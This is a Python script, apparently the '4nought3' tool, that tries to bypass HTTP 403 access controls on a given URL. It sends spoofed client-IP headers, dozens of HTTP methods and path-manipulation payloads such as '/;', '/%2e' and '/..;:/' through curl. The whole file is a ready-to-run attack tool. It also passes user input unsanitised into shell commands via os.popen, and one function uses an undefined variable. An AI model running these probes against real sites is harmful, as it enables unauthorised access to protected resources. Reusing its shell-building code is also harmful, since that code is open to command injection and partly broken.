#!/usr/bin/python
#https://github.com/blackburn27/4nought3
import os
import sys

BLUE = '\033[34m'
GREEN = '\033[32m'
RED = '\033[31m'
YELLOW = '\033[33m'
WHITE = '\033[0m'
RSTCOLORS = '\033[0m'


BANNER = r"""
       (   (             (                  )     (     
  *   ))\ ))\ )       (  )\ )     (      ( /(     )\ )  
` )  /(()/(()/(  (  ( )\(()/((    )\     )\())(  (()/(  
 ( )(_))(_))(_)) )\ )((_)/(_))\((((_)( |((_)\ )\  /(_)) 
(_(_()|_))(_))_ ((_|(_)_(_))((_))\ _ )\|_ ((_|(_)(_))   
|_   _|_ _||   \| __| _ ) _ \ __(_)_\(_) |/ /| __| _ \  
  | |  | | | |) | _|| _ \   / _| / _ \   ' < | _||   /  
  |_| |___||___/|___|___/_|_\___/_/ \_\ _|\_\|___|_|_\  
                                                        
"""


def host_header_injection(header, defined_url):
    indicator = ""
    command = os.popen("curl -k -s -I -X GET -H \"%s\" %s" % (header, defined_url))
    method = "GET"
    text = command.read()
    status = text.strip().split(" ")[1]
    length = text.strip().split(" ")[12].split()[0]
    if "Authenticate" in text:
        indicator = "--> AUTH"
    if int(status) == 200:
        return(f"{GREEN}{status}{RSTCOLORS},{method},{length} {header} {YELLOW}{indicator}{RSTCOLORS}\n")
    elif int(status) > 299 and int(status) < 400:
        return(f"{YELLOW}{status}{RSTCOLORS},{method},{payload_url} {YELLOW}{indicator}{RSTCOLORS}\n")
    else:
        return(f"{RED}{status}{RSTCOLORS},{method},{length} {header} {YELLOW}{indicator}{RSTCOLORS}\n")

def http_methods(method, defined_url):
    indicator = ""
    command = os.popen("curl -k -s -I -X %s %s" % (method, defined_url))
    text = command.read()
    status = text.strip().split(" ")[1]
    length = text.strip().split(" ")[12].split()[0]
    if "Authenticate" in text:
        indicator = "--> AUTH"
    if int(status) == 200:
        return(f"{GREEN}{status}{RSTCOLORS},{method},{length} {defined_url} {YELLOW}{indicator}{RSTCOLORS}\n")
    elif int(status) > 299 and int(status) < 400 or int(status) == 401:
        return(f"{YELLOW}{status}{RSTCOLORS},{method},{defined_url} {YELLOW}{indicator}{RSTCOLORS}\n")
    else:
        return(f"{RED}{status}{RSTCOLORS},{method},{defined_url} {YELLOW}{indicator}{RSTCOLORS}\n")
    
def url_injection(payload, defined_url):
    indicator = ""
    uri = defined_url.split("/")[-1]
    uri = "/"+uri
    method = "GET"
    remaining_url = defined_url.replace(uri, "")
    payload_url = remaining_url+payload+uri
    command = os.popen("curl -k -s -I '%s'" % (payload_url))
    try:
        text = command.read()
        status = text.strip().split(" ")[1]
        if "Authenticate" in text:
            indicator = "--> AUTH"
        if "Content-Length" not in text:
            length = "0"
        else:
            length = text.strip().split(" ")[12].split()[0]
        if int(status) == 200:
            return(f"{GREEN}{status}{RSTCOLORS},{method},{length} {payload_url} {YELLOW}{indicator}{RSTCOLORS}\n")
        elif int(status) > 299 and int(status) < 400 or int(status) == 401:
            return(f"{YELLOW}{status}{RSTCOLORS},{method},{payload_url} {YELLOW}{indicator}{RSTCOLORS}\n")
        else:
            return(f"{RED}{status}{RSTCOLORS},{method},{length} {payload_url} {YELLOW}{indicator}{RSTCOLORS}\n")
    except IndexError:
        return ""

def url_end_injection(payload, defined_url):
    indicator = ""
    payload_url = defined_url + payload
    method = "GET"
    command = os.popen("curl -k -s -I '%s'" % (payload_url))
    text = command.read()
    status = text.strip().split(" ")[1]
    length = text.strip().split(" ")[12].split()[0]
    if "Authenticate" in text:
        indicator = "--> AUTH"
    if int(status) == 200:
        return(f"{GREEN}{status}{RSTCOLORS},{method},{length} {payload_url} {YELLOW}{indicator}{RSTCOLORS}\n")
    elif int(status) > 299 and int(status) < 400 or int(status) == 401:
        return(f"{YELLOW}{status}{RSTCOLORS},{method},{payload_url} {YELLOW}{indicator}{RSTCOLORS}\n")
    else:
        return(f"{RED}{status}{RSTCOLORS},{method},{length} {payload_url} {YELLOW}{indicator}{RSTCOLORS}\n")
    
def banner():
    print(BANNER)
    print(f"Usage: {sys.argv[0]} url")
    print("From blackburn27 & unkn0wnsyst3m with love")

if len(sys.argv) != 2:
    banner()

else:
    print(f"{YELLOW}{BANNER}{RSTCOLORS}")
    url = sys.argv[1]
#//////////////////////HOST HEADER INJECTIONS////////////////////////
    print(f"{BLUE}[+]Trying Host Header Injections:{RSTCOLORS}")
    print(host_header_injection("X-Forwarded-For: 127.0.0.1", url),end="")
    print(host_header_injection("X-Originating-IP: 127.0.0.1", url),end="") 
    print(host_header_injection("X-Remote-IP: 127.0.0.1", url),end="")
    print(host_header_injection("X-Client-IP: 127.0.0.1", url),end="")
    print(host_header_injection("X-Forwarded-Host: 127.0.0.1", url),end="")
    print(host_header_injection("X-Host: 127.0.0.1", url),end="")
#//////////////////////POTENTIAL METHODS////////////////////////////
    print(f"{BLUE}[+]Trying all the potential HTTP methods{RSTCOLORS}")
    print(http_methods("GET", url),end="")
    print(http_methods("POST", url),end="")
    print(http_methods("PUT", url),end="")
    print(http_methods("CONNECT", url),end="")
    print(http_methods("COPY", url),end="")
    print(http_methods("PATCH", url),end="")
    print(http_methods("TRACE", url),end="")
    print(http_methods("HEAD", url),end="")
    print(http_methods("UPDATE", url),end="")
    print(http_methods("LABEL", url),end="")
    print(http_methods("OPTIONS", url),end="")
    print(http_methods("MOVE", url),end="")
    print(http_methods("SEARCH", url),end="")
    print(http_methods("ARBITRARY", url),end="")
    print(http_methods("CHECKOUT", url),end="")
    print(http_methods("UNCHECKOUT", url),end="")
    print(http_methods("UNLOCK", url),end="")
    print(http_methods("MERGE", url),end="")
    print(http_methods("BASELINE-CONTROL", url),end="")
    print(http_methods("ACL", url),end="")
#/////////////////////URL Injections//////////////////////////
    print(f"{BLUE}[+]Trying url injections{RSTCOLORS}")
    print(url_injection("/;", url),end="")
    print(url_injection(";", url),end="")
    print(url_injection(";/", url),end="")
    print(url_injection(";/;", url),end="")
    print(url_injection("//", url),end="")
    print(url_injection("/.;", url),end="")
    print(url_injection("/%2e", url),end="")
    print(url_injection("%2e", url),end="")
    print(url_injection("/%00/", url),end="")
    print(url_injection("/.;/:", url),end="")
    print(url_injection("/;foo=bar", url),end="")
    print(url_injection(";foo=bar", url),end="")
    print(url_injection("/;foo=bar;", url),end="")
    print(url_end_injection("%20/", url),end="") 
    print(url_end_injection("/%09/", url),end="")
    print(url_end_injection("/%2e/", url),end="") 
    print(url_end_injection("/.", url),end="") 
    print(url_end_injection("//", url),end="")
    print(url_end_injection("/abcde/", url),end="")
    print(url_end_injection("/.abcde/", url),end="")
    print(url_end_injection("//?abcde/", url),end="")
    print(url_end_injection("/..;:/", url),end="")
